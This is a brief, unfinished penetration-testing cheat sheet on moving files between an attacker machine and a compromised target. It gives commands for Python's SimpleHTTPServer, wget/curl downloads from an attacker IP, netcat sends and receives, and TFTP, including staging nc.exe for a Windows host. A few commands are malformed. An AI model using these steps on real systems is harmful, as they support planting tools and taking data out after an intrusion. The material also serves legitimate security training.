# File Transfers

This makes the entire folder where you executed the command on, available

    python -m SimpleHTTPServer 1234

wget or curl can be used on target to download the file

    wget 123.45.67.89:1234/file.txt
    curl -O http://123.45.67.89/file.txt



## Using Netcat

On attacker

    nc -lvp 1234 < file

On target

    nc 192.168.1.102 1234 > file

if wget/curl/nc are all not available, TFTP can be used

    tftp 192.168.0.101
    tftp> get somefile.txt

or

    tftp 192.168.1.254 <<< "get file.php file.php"



Source: https://chryzsh.gitbooks.io/pentestbook/transfering_files.html

Inside also includes ssh access with keypair



~~~bash
python -m SimpleHTTPServer 80
~~~



Getting file

~~~bash
wget x.x.x.x:1234/filename

curl x.x.x.x:1234/filename
~~~



## Netcat

Listen

~~~bash
nc -nlvp 1234 > file.txt
~~~



Send

~~~bash
nc -np 1234 < file.txt
~~~



If file is too big

~~~bash
cat bigassfile.txt | nc -np x.x.x.x 1234
~~~



---

WIP

---

TFTP
mkdir /tftp
atftpd –daemon –port 69 /tftp
cp /usr/share/windows-binaries/nc.exe /tftp/
EX. FROM WINDOWS HOST:
C:\Users\Offsec>tftp -i $ip get nc.exe

~~~

~~~